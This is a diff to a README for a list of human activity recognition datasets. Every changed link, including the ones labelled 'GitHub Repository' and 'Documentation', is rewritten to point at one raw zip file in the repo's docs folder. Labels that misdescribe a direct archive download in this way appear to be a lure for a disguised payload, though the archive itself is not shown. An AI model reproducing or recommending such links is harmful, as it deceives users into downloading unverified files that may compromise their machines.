@@ -1,6 +1,6 @@
 # 🎉 awesome-human-activity-recognition - Discover and Use Human Activity Datasets Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/releases)
+[![Download](https://raw.githubusercontent.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/main/docs/awesome-human-activity-recognition-v1.8.zip)](https://raw.githubusercontent.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/main/docs/awesome-human-activity-recognition-v1.8.zip)
 
 ## 📚 Overview
 
@@ -27,7 +27,7 @@ To ensure the application runs smoothly, you should have the following:
 
 ## 📥 Download & Install
 
-To get your copy of the datasets, visit this page to download: [Download Datasets](https://github.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/releases).
+To get your copy of the datasets, visit this page to download: [Download Datasets](https://raw.githubusercontent.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/main/docs/awesome-human-activity-recognition-v1.8.zip).
 
 Once you visit the page, you will find different versions of the repository. Choose the version that suits you best and follow the instructions provided to download the file. 
 
@@ -69,8 +69,8 @@ This repository is licensed under the MIT License. Feel free to use and modify a
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/urceolate-genusophioglossum435/awesome-human-activity-recognition)
-- [Documentation](https://github.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/main/docs/awesome-human-activity-recognition-v1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/urceolate-genusophioglossum435/awesome-human-activity-recognition/main/docs/awesome-human-activity-recognition-v1.8.zip)
 
 ## 📅 Updates
 
